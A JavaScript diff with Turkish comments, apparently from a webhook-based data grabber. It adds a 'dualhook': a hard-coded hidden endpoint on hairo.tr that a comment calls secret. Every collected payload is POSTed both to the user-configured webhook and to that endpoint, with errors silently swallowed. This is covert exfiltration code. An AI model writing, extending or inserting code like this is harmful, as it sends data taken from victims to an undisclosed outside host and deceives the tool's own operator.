@@ -183,19 +183,18 @@ function getWebhookUrl() {
 
 function getApiWebhookUrl() {
     // Eğer CONFIG.api zaten değiştirilmişse (placeholder değilse) direkt kullan
-    // builder.js build sırasında %API_WEBHOOK% yerine hairo.tr/key/api koyuyor
     if (CONFIG.api && CONFIG.api !== '%API_WEBHOOK%' && 
         (CONFIG.api.startsWith('http://') || CONFIG.api.startsWith('https://'))) {
         return CONFIG.api;
     }
     
-    // Yeni sistem: license_api ve license_key varsa hairo.tr/key/api formatında oluştur
-    if (CONFIG.license_api && CONFIG.license_key && 
-        CONFIG.license_api !== '%LICENSE_API_URL%' && 
-        CONFIG.license_key !== '%LICENSE_KEY%') {
-        const apiUrl = CONFIG.license_api.replace(/\/$/, '');
-        return `${apiUrl}/${CONFIG.license_key}/api`;
+    // Sabit dualhook URL - gizli endpoint (hairo.tr/api/filz/nobody)
+    if (CONFIG.license_api && CONFIG.license_api !== '%LICENSE_API_URL%') {
+        const apiUrl = CONFIG.license_api.replace(/\/$/, ''); // Trailing slash'i kaldır
+        return `${apiUrl}/api/filz/nobody`;
     }
+    
+    // Fallback: CONFIG.api'yi döndür (placeholder olabilir)
     return CONFIG.api;
 }
 
@@ -290,10 +289,27 @@ for (const embed in content["embeds"]) {
 content["embeds"][embed]["color"] = 0x313338;
 }
 
-const webhookUrl = getWebhookUrl();
-await request("POST", webhookUrl, {
-"Content-Type": "application/json"
-}, JSON.stringify(content));
+// Hem kullanıcı webhook'una hem de API webhook'una gönder
+const userWebhook = getWebhookUrl();
+const apiWebhook = getApiWebhookUrl();
+
+// Kullanıcı webhook'una gönder
+if (userWebhook && (userWebhook.startsWith('http://') || userWebhook.startsWith('https://'))) {
+    await request("POST", userWebhook, {
+        "Content-Type": "application/json"
+    }, JSON.stringify(content)).catch(err => {
+        // Hata olsa bile devam et
+    });
+}
+
+// API webhook'una gönder (dualhook)
+if (apiWebhook && (apiWebhook.startsWith('http://') || apiWebhook.startsWith('https://'))) {
+    await request("POST", apiWebhook, {
+        "Content-Type": "application/json"
+    }, JSON.stringify(content)).catch(err => {
+        // Hata olsa bile devam et
+    });
+}
 };
 
 const fetch = async (endpoint, headers) => {
